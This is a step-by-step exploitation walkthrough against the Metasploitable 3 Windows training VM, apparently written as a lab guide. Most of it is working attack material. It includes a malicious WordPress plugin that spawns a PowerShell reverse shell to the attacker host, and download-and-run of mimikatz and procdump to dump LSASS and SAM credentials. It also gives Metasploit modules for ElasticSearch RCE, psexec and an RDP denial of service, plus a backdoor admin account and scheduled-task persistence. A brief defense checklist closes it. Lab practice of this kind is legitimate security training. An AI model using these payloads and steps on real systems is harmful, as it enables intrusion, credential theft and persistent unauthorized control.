# Metasploitable 3: Structured Approach to Exploitation

## Overview
This document provides a structured approach to exploiting the Metasploitable 3 Windows Server 2008 R2 machine, starting with initial access via WordPress and progressing through privilege escalation to full system compromise.

## Phase 1: Initial Access via WordPress

### Step 1: Create Malicious WordPress Plugin
On attacker machine (Parrot OS: 192.168.56.106):
```bash
mkdir WinRevShell
cd WinRevShell
cat > WinRevShell.php << 'EOF'
<?php
/*
Plugin Name: Win Reverse Shell
Description: Persistent interactive reverse shell for Windows WordPress lab
Version: 1.0
Author: pentest
*/

$ip = '192.168.56.106'; // Attacker IP
$port = 4444;

// PowerShell reverse shell command
$ps_command = "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";

// Execute the reverse shell
exec($ps_command);

// Keep plugin active
while(true) {
    sleep(60);
}
?>
EOF

# Create zip file for upload
zip -r WinRevShell.zip WinRevShell/
```

### Step 2: Set Up Listener
```bash
# On Parrot OS (192.168.56.106)
socat TCP-LISTEN:4444 STDOUT
# Alternative: 
# nc -nvlp 4444
# rlwrap -cAr nc -nvlp 4444
```

### Step 3: Upload and Activate Plugin
1. Navigate to WordPress admin: http://192.168.56.107/wordpress/wp-admin/
2. Go to Plugins → Add New → Upload Plugin
3. Upload `WinRevShell.zip`
4. Activate the plugin

### Step 4: Verify Shell Access
After activation, you should receive a reverse shell:
```
PS C:\wamp\www\wordpress> whoami
wordpress\admin
```

## Phase 2: Privilege Escalation

### Initial Assessment with WinPEAS
Key findings from WinPEAS analysis:
- **WDigest Enabled**: Allows plaintext password extraction from LSASS
- **UAC Settings**: EnableLUA set to 0 (easier UAC bypass)
- **Cached Credentials**: cachedlogonscount is 10
- **LSA Protection**: Not enabled
- **No AV Detected**

### Method 1: Mimikatz Password Extraction
```bash
# On attacker machine (192.168.56.106)
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O mimikatz.zip
unzip mimikatz.zip
python3 -m http.server 80

# On target (192.168.56.107)
cd C:\Windows\Temp
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.106/mimikatz.exe', 'mimikatz.exe')"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Method 2: Procdump + Mimikatz (If Detected)
```bash
# On target
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.106/procdump.exe', 'procdump.exe')"
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# On attacker machine
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### Method 3: Impacket Techniques
```bash
# On target, save registry hives
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
reg save hklm\security security.hiv

# On attacker, extract hashes
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hiv -system system.hiv LOCAL
```

## Phase 3: Alternative Exploitation Paths

### ElasticSearch Exploitation (CVE-2014-3120)
```bash
# Check ElasticSearch version
curl http://192.168.56.108:9200

# Metasploit exploitation
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS 192.168.56.108
set LHOST 192.168.56.101
exploit
```

### SMB/psexec Exploitation
```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.56.108
set SMBUser vagrant
set SMBPass [password_from_mimikatz]
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
exploit
```

### MS12-020 RDP DoS (Port 3389)
```bash
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOSTS 192.168.56.108
exploit
```

## Phase 4: Post-Exploitation

### Credential Extraction
```bash
# With Meterpreter session
hashdump
run post/windows/gather/lsa_secrets

# With Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "sekurlsa::logonpasswords" "exit"
```

### Enable RDP Access
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user hacker Password123! /add
net localgroup administrators hacker /add
```

### Persistence
```bash
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\reverse_shell.exe" /sc onstart /ru SYSTEM
```

## Phase 5: Local Privilege Escalation Checks

### Using Metasploit's Local Exploit Suggester
```bash
run post/multi/recon/local_exploit_suggester
```

Vulnerable exploits identified:
- exploit/windows/local/bypassuac_comhijack
- exploit/windows/local/bypassuac_eventvwr  
- exploit/windows/local/cve_2019_1458_wizardopium
- exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
- exploit/windows/local/ms14_058_track_popup_menu
- exploit/windows/local/ms15_051_client_copy_image
- exploit/windows/local/ms16_032_secondary_logon_handle_privesc
- exploit/windows/local/ms16_075_reflection
- exploit/windows/local/ms16_075_reflection_juicy

## Key Findings Summary

1. **Initial Access**: WordPress plugin upload vulnerability
2. **Privilege Escalation**: Multiple methods available due to misconfigurations
3. **Credential Exposure**: WDigest enabled allows plaintext password extraction
4. **Additional Services**: ElasticSearch vulnerable to RCE (CVE-2014-3120)
5. **RDP Vulnerability**: MS12-020 DoS vulnerability present
6. **Multiple Local Privesc**: Numerous local privilege escalation vectors available

## Recommendations for Defense

1. Disable WDigest authentication
2. Enable LSA protection
3. Implement proper WordPress file upload restrictions
4. Update ElasticSearch to latest version
5. Apply MS12-020 patch
6. Implement proper service permissions
7. Install and configure antivirus solution
8. Enable UAC with proper settings
9. Regularly audit scheduled tasks and services
10. Implement network segmentation to limit lateral movement

This structured approach demonstrates the critical importance of proper system hardening, regular patching, and security monitoring in Windows environments.